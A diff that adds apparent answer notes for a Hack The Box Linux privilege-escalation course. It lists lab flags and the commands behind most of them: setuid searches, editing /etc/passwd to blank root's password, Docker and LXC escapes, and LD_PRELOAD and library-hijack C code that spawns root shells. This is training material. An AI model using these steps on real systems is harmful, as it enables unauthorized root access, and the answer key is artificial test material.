@@ -1,0 +1,121 @@
+HTB Linux privilege escalation
+
+Q: Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.
+A: HTB{1nt3rn4l_5cr1p7_l34k}
+
+Q: What is the latest Python version that is installed on the target?
+A: 3.11
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+
+Q: Find the WordPress database password.
+A: W0rdpr3ss_sekur1ty!
+cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
+
+Q: Review the PATH of the htb-student user. What non-default directory is part of the user's PATH?
+A: /tmp
+echo $PATH
+
+Q: Use the privileged group rights of the secaudit user to locate a flag.
+A: ch3ck_th0se_gr0uP_m3mb3erSh1Ps!
+cd /var/log | grep -r "flag" .
+
+Q: Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.
+A: HTB{35c4p3_7h3_r3stricted_5h311}
+echo "$(<flag.txt )"
+
+Q: Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).
+A: /bin/sed
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+Q: Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).
+A: /usr/bin/facter
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+
+Q: What command can the htb-student user run as root?
+A: /usr/bin/openssl
+sudo -l
+
+Q: Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.
+A: HTB{c4paBili7i3s_pR1v35c}
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+su root
+
+Q:  Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.
+A: 91927dad55ffd22825660da88f2f92e0
+echo "script" >exploit.sh
+chmod +x exploit.sh
+./exploit.sh
+
+Q: Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.
+A: 14347a2c977eb84508d3d50691a7ac4b
+
+Q:  Escalate the privileges and submit the contents of flag.txt as the answer.
+A: HTB{C0nT41n3rs_uhhh}
+lxc exec privesc /bin/sh
+cat /mnt/root/root/flag.txt
+
+Q: Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer.
+A: HTB{D0ck3r_Pr1vE5c}
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+cat /root/flag.txt
+
+Q: Escalate the privileges and submit the contents of flag.txt as the answer.
+A: HTB{l0G_r0t7t73N_00ps}
+
+Q: Review the NFS server's export list and find a directory holding a flag.
+A: fc8c065b9384beaa162afe436a694acf
+sudo mount -t nfs 10.129.2.210:/var/nfs/general /mnt2
+cd /mnt2
+ls -la
+cat exports_flag.txt
+
+Q: Escalate privileges using a different Kernel exploit. Submit the contents of the flag.txt file in the /root/kernel_exploit directory.
+A: 46237b8aa523bc7e0365de09c0c0164f
+
+Q: Escalate privileges using LD_PRELOAD technique. Submit the contents of the flag.txt file in the /root/ld_preload directory.
+A: 6a9c151a599135618b8f09adc78ab5f1
+#include <unistd.h>  // Include this header for setuid() and setgid() functions
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+mv root.so /tmp/root.so
+sudo LD_PRELOAD=/tmp/root.so /usr/bin/openssl
+cat /root/ld_preload/flag.txt
+
+Q:  Follow the examples in this section to escalate privileges, recreate all examples (don't just run the payroll binary). Practice using ldd and readelf. Submit the version of glibc (i.e. 2.30) in use to move on to the next section.
+A: 2.27
+ldd /home/mrb3n/payroll
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h> // Include the header for setuid function
+
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+}
+gcc -shared -fPIC -o libexploit.so exploit.c
+ldd --version
+
+Q: Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.
+A: 
+Q: Follow along with the examples in this section to escalate privileges. Try to practice hijacking python libraries through the various methods discussed. Submit the contents of flag.txt under the root user as the answer.
+A: HTB{SuD0_e5c4l47i0n_1id}
+sudo -l
+sudo -u#-1 /bin/ncdu
+cat /root/flag.txt
+
+Q: Escalate the privileges and submit the contents of flag.txt as the answer.
+A: HTB{p0Lk1tt3n}
+
+Q: Escalate the privileges and submit the contents of flag.txt as the answer.
+A: HTB{D1rTy_DiR7Y}
